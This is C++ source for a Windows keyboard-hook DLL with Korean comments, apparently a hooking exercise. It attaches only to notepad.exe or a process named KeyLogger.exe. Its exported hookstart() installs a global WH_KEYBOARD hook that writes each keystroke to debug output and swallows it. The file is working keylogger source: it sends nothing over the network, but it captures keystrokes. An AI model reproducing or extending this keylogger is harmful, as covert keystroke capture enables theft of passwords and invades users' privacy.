// dllmain.cpp : DLL 응용 프로그램의 진입점을 정의합니다.
#include "windows.h"
#include "cstdio"
#include "tchar.h"
#include "tlhelp32.h"
#include "psapi.h"

HINSTANCE g_hInstance = NULL;
HHOOK g_hHook = NULL;
HWND g_hWnd = NULL;

TCHAR buf[BUFSIZ] = { 0, };		//

TCHAR *pt = NULL;				//

DWORD sPid;		//process id

HANDLE sHnd;	//Handle


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD  ul_reason_for_call,LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		
		//GetCurrentProcess();
		sPid = GetCurrentProcessId();
		// process name
		//	>> installer or notepad.exe 아니면, return FALSE
		sHnd = OpenProcess(PROCESS_ALL_ACCESS,FALSE,sPid);
		if (sHnd == NULL) {
			OutputDebugStringW(L"sHnd Fail\n");
		}

		

		if ( GetModuleFileNameExW(sHnd, NULL, buf, sizeof(buf))==0 ) {
			OutputDebugStringW(L"GetModuleFileNameEx Fail\n");
		}
		pt = _tcsrchr(buf, '\\');

		//notepad hooking
		if (!_tcscmp(pt + 1, L"notepad.exe")) {
			g_hInstance = hinstDLL;
			OutputDebugStringW(L"notepad attach\n");
			return TRUE;
		}

		//keylogger hooking(essential)
		else if (!_tcscmp(pt + 1, L"KeyLogger.exe")) {
			g_hInstance = hinstDLL;
			OutputDebugStringW(L"KeyLogger attach\n");
			return TRUE;
		}
		else {
			g_hInstance = hinstDLL;
			return FALSE;
		}



		//OutputDebugStringW(L"attach");
		g_hInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

LRESULT CALLBACK KeyBoardProc(int nCode, WPARAM wParam, LPARAM lParam) {
	TCHAR buffer[100] = { 0, };
	if (nCode >= 0) {
		if (!(lParam & 0x80000000)) {

			HANDLE sdwHandle;
			sdwHandle = GetCurrentProcess();
			DWORD dwExitCode = NULL;
			GetExitCodeProcess(sdwHandle, &dwExitCode);

			if (dwExitCode == STILL_ACTIVE) {
				wsprintfW(buffer, L"%c", wParam);
				::OutputDebugStringW(buffer);
				return 1;
			}
			else {
				::OutputDebugStringW(_T("Current is Process is Dead\n"));
				return 1;
			}
			
		}
	}

	return CallNextHookEx(g_hHook, nCode, wParam, lParam);
}

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void hookstart() {
		
		//HANDLE sdwHandle;
		//sdwHandle = GetCurrentProcess();
		//DWORD dwExitCode = NULL;
		//GetExitCodeProcess(sdwHandle, &dwExitCode);
		//if (dwExitCode == STILL_ACTIVE) {
		//	g_hHook = SetWindowsHookExW(WH_KEYBOARD, KeyBoardProc, g_hInstance, 0);
		//}
		g_hHook = SetWindowsHookExW(WH_KEYBOARD, KeyBoardProc, g_hInstance, 0);
	}

	__declspec(dllexport) void hookstop() {
		if (g_hHook) {
			UnhookWindowsHookEx(g_hHook);
			g_hHook = NULL;
		}
	}

#ifdef __cplusplus
}
#endif